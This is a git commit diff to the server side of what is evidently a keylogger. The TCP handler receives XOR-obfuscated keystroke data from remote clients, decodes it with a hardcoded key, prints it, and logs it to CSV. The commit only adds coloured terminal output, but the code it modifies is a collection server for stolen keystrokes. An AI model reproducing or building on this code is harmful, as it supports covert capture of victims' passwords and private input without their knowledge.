d730e6c31ca02c9f97f0d7582f95509664b6356f
yeet <yeet@yeet.com>
2021-05-03 12:01:47 +0000

    (mod/output)colored terminal display

--- server/TCP_handler.py
+++ server/TCP_handler.py
@@ -30,6 +30,13 @@ def log_csv(ip_cli, ipt):
 class TCPHandler(BaseRequestHandler):
 
     def handle(self):
+        Red='\033[31m'          # Red
+        Green='\033[32m'        # Green
+        Yellow='\033[33m'       # Yellow
+        Blue='\033[34m'         # Blue
+        Cyan='\033[36m'         # Cyan
+        NC="\033[m"               # Color Reset 
+
         client = self.request.getpeername()
         ip_cli = f'{client[0]}:{client[1]}'
         log_csv(ip_cli, "200 NEW CONNEXION")
@@ -45,7 +52,7 @@ class TCPHandler(BaseRequestHandler):
             #  Decode data here, before writing it into csv.
             data = str(xor(data, 'B4N4N4'), 'ascii')
             cur_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-            print(f'[+] {cur_time}: Received new keystrokes from {ip_cli}: {data}')
+            print(f'{Green}[+] {Red}{cur_time}{NC}: Received new keystrokes from {Red}{ip_cli}{NC}:{Cyan} {data}{NC}')
             log_csv(ip_cli, f'{data}\n{cur_time}')
 
 
